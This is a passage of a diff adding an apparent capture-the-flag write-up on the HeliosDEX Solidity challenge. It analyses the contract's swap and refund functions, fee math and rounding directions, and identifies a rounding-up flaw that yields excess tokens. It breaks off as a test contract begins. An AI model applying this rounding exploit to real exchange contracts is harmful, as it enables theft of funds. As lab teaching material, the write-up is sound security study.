+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossELD <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> netELD <span style="color:#7a8478">=</span> grossELD <span style="color:#7a8478">-</span> fee;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The &ldquo;gross&rdquo; value of token is computed with <a href="https://docs.openzeppelin.com/contracts/5.x/api/utils#Math-mulDiv-uint256-uint256-uint256-enum-Math-Rounding-"><code>Math.mulDiv(x, y, denominator, rounding)</code> from openzeppelin</a>  which calculates $ \frac{x * y}{denominator} $ and round the results with the <code>rounding</code> direction (up or down).</p>
+<ul>
+<li><code>x</code> is the value we send</li>
+<li><code>y</code> is the exchangeRatio, which is the answer to &ldquo;how many token I get for  ether&rdquo;, it is different for each tokens and for ELD it is <code>2</code> (defined in HeliosDEX contract)</li>
+<li><code>denominator</code> is $10^{18}$ (1 ether in wei)</li>
+<li><code>rounding</code> is <code>Math.Rounding(0)</code></li>
+</ul>
+<p>Then, the fees are computed with the following :</p>
+$$ fee = \frac {(grossELD * feeBps)}{10000} $$<p>with <code>feeBps = 25</code> (defined in <code>HeliosDEX</code> contract) :</p>
+$$ fee = \frac {(grossELD * 25)}{10000} $$<p>We can also rewrite it like that :</p>
+$$ fee = grossELD * \frac{25}{10000}  $$<p>
+</p>
+$$ \ $$<p>
+</p>
+$$ fee = grossELD * 0.25 \%  $$<p>And we subtract the grossELD by these fees to get the net value of token we get :</p>
+$$ netELD = grossELD - fee $$<p>
+</p>
+$$ netELD = grossELD - grossELD * 0.25 \% $$<p>Meaning we lost 0.25% of the value we send in fees which is not so much.</p>
+<p>After these formalities, the contract checks if there are enough token to give us in the total supply, if yes, it subtract the quantity of tokens wanted from the total supply.</p>
+<p>And finally, the <code>netELD</code> tokens amount is transferred to our balance on <code>balanceOf[address]</code>.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#d699b6">require</span>(netELD <span style="color:#7a8478">&lt;=</span> reserveELD, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>reserveELD <span style="color:#7a8478">-=</span> netELD;
+</span></span><span style="display:flex;"><span>eldorionFang.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netELD);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And the tokens are transferred to our balance on <code>balanceOf[address]</code></p>
+<p>This process is the same for the tree tokens except from two differences, the exchange ratio and the rounding direction :</p>
+<ul>
+<li>for ELD : ratio = 2, and rounding direction is 0</li>
+<li>for MAL : ratio = 4, and rounding direction is 1</li>
+<li>for HLS : ratio = 10, and rounding direction is 3</li>
+</ul>
+<p>So for 1 Ether I get around <code>2 ELD</code>, <code>4 MAL</code> and <code>10 HLS</code>.
+But for 0.99 Ether, I get <code>0 ELD</code>, <code>4 MAL</code> and <code>10 HLS</code>, due to the rounding direction. With a positive value, the result is rounded up, if zero, it is rounded down.</p>
+<p>Before I mentioned the <code>underHeliosEye</code> modifier applied to every swap function:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">modifier</span> <span style="color:#b2c98f">underHeliosEye</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The latter makes sure we send at least 1 wei of value to swap.</p>
+<p>This done, let&rsquo;s look at the <code>oneTimeRefund</code> function used to refund our tokens and get back ethers.</p>
+<h5 id="withdraw-function">withdraw function</h5>
+<details>
+  <summary style="color: #F99417; cursor: pointer">oneTimeRefund(address item, uint256 amount)</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">oneTimeRefund</span>(<span style="color:#dbbc7f">address</span> item, <span style="color:#dbbc7f">uint256</span> amount) <span style="color:#e67e80">external</span> heliosGuardedTrade {
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(<span style="color:#7a8478">!</span>hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>], <span style="color:#b2c98f">&#34;HeliosDEX: refund already bestowed upon thee&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(amount <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;HeliosDEX: naught for naught is no trade. Offer substance, or be gone!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> exchangeRatio;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(eldorionFang)) {
+</span></span><span style="display:flex;"><span>        exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioELD;
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(eldorionFang.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;ELD transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        reserveELD <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>    } <span style="color:#e67e80">else</span> <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(malakarEssence)) {
+</span></span><span style="display:flex;"><span>        exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioMAL;
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(malakarEssence.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;MAL transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        reserveMAL <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>    } <span style="color:#e67e80">else</span> <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(heliosLuminaShards)) {
+</span></span><span style="display:flex;"><span>        exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioHLS;
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(heliosLuminaShards.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;HLS transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        reserveHLS <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>    } <span style="color:#e67e80">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">revert</span>(<span style="color:#b2c98f">&#34;HeliosDEX: Helios descries forbidden offering&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> grossEth <span style="color:#7a8478">=</span> Math.mulDiv(amount, <span style="color:#d699b6">1</span>e18, exchangeRatio);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossEth <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> netEth <span style="color:#7a8478">=</span> grossEth <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(netEth);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    emit HeliosRefund(item, amount, netEth);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>The contracts check if we already <code>refunded</code> our token and if the amount to refund is greater than zero.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#d699b6">require</span>(<span style="color:#7a8478">!</span>hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>], <span style="color:#b2c98f">&#34;HeliosDEX: refund already bestowed upon thee&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">require</span>(amount <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;HeliosDEX: naught for naught is no trade. Offer substance, or be gone!&#34;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After that, the exchange ratio is set according to the token we want to refund and the supply of token is increased, example for ELD :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(eldorionFang)) {
+</span></span><span style="display:flex;"><span>    exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioELD;
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(eldorionFang.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;ELD transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    reserveELD <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The tokens are transferred back from us to the contract, but if we have not enough balance or the contract has not enough allowance on our balance, the execution is reverted.</p>
+<p>Then the amount of ethers subtracted by the fees is computed and transferred to us :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> grossEth <span style="color:#7a8478">=</span> Math.mulDiv(amount, <span style="color:#d699b6">1</span>e18, exchangeRatio);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossEth <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10000</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> netEth <span style="color:#7a8478">=</span> grossEth <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(netEth);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For example for ELD :</p>
+$$ netETH = grossETH - fee $$$$ netETH = \frac {amount * 10^{18}}{2} - (\frac {amount * 10^{18}}{2}) * 0.25 \% $$<p>In shorts we get the amount of ELD token divided by 2, subtracted by 0.25% of fees.</p>
+<p>And our address is set to refunded and we receive the ethers afterward. So we can refund one time for every tokens.</p>
+<p>This refund function is under the <code>heliosGuardedTrade</code> modifier :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">modifier</span> <span style="color:#b2c98f">heliosGuardedTrade</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(_tradeLock <span style="color:#7a8478">!=</span> <span style="color:#e67e80">true</span>, <span style="color:#b2c98f">&#34;HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler&#34;</span>);
+</span></span><span style="display:flex;"><span>    _tradeLock <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;  
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">_</span>;
+</span></span><span style="display:flex;"><span>    _tradeLock <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Which ensures we can&rsquo;t perform a reeantrancy attack.</p>
+<h1 id="solving">Solving</h1>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>As we saw earlier, the <a href="#swap-functions">swap functions</a> either round up or round down the value we sent it.</p>
+<p>We can test it out with a test contract to mimic the sending of the funds:</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Test contract</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
